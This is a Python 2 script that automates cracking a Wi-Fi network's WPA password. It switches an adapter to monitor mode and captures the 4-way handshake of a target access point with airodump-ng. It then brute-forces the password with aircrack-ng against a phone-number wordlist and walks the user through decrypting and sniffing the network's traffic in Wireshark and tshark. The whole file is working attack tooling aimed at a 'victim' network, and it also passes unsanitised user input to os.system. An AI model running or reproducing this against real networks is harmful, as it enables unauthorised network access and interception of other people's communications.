#!/usr/bin/env python
from os import system
from time import sleep
from termcolor import colored



wireless_card = raw_input("Enter your wireless adapter card (we will change it to monitor mode): ")
# monitor mode
print("turning your wifi adapter card to monitor mode..")
mon0 = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(wireless_card)
system(mon0)

# scan with airodump-ng the network to get available wifi ap's
airodump = 'airodump-ng {0}'.format(wireless_card)
system(airodump)

# get from the user the bssid (mac) of the victim ap
bssid = raw_input("please Enter the BSSID of the network ap you want to crack: ")

# get the channel of victim from the user
channel = raw_input("Enter the channel number that the wireless network is currently running on: ")
save = raw_input("enter the path to the 4-way-handshake file")
print colored("...", "red"),
print colored("Airodump will start now", "red")
sleep(5)

# runnig airodump-ng on the victim ap and we will wait until threre is going 
# to be a handshake process the user will see it on the screen when a new device is 
# connected to the network. 
airodump2 = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, bssid, save, wireless_card)
system(airodump2)
print("please wait until you will see new cooction..")
print colored("Handshake is captured", "green")
print colored("Cracking the handshake with aircrack-ng is starting...", "green")

# 'Aircrack-ng' parameters set
# the wordlist could be very big, but our wordlist is under the assumption 
# that a home wifi router password is in most casses the one of the home tenant 
# phone number, in this case the bruth force process will take a few minutes in the worse case.

#crunch <min> max<max> <characterset> -t <pattern> -o <output filename> 
# create the wordlist file.

wordlist = raw_input("Specify the path to your wordlist dictionary: ")
#the cap file that was created.
save2 = raw_input("Enter the .cap file name that is saved in the directory you previously entered: e.g: 01.cap")
print colored("password will be cracked in a while !!", "red")
# find the password via the wordlist.
crack = 'aircrack-ng -a 2 {0}{1} -w {2} '.format(save, save2, wordlist)
system(crack)

# now, when the password was cracked we will open wireshark and 
# start to analyse the data, the data without the password is encrepted
# but with the password and the instruction that the user will see
# he will be mennged to see the info.

system("wireshark &")
print colored("...", "red"),
print colored("capture the 4 way hand shake process in wireshark","red")
print colored("...", "red"),
print colored("now in wireshark we open the cap file through File -> Open","red")
print("")
print colored("...", "red"),
print colored("We need to change the protocol to IEEE 802.11","red")
print("")
print colored("...", "red"),
print colored("Go to Edit -> Preferences -> Protocols -> IEE 802.11 -> Decryptkey - Edit -> Create -> wpa-wpd -> PASS:SSIDNAME ->APPLY . WE NOW HAVE THE DECRYPTION!!","red")
print colored("...", "green"),
print colored("secsess !!","green")
sleep(5)

print("to see the packets please follow the orders")
sleep(10)
print("sudo -i")
sleep(5)
print("tshark -i x -w output.cap , where x is your wifi adapter card")
sleep(5)
print("type Ctrl C whenever you want to stop sniffing")
sleep(5)
print("tshark -r output.cap")
sleep(5)
print("wireshark -r output.cap &")
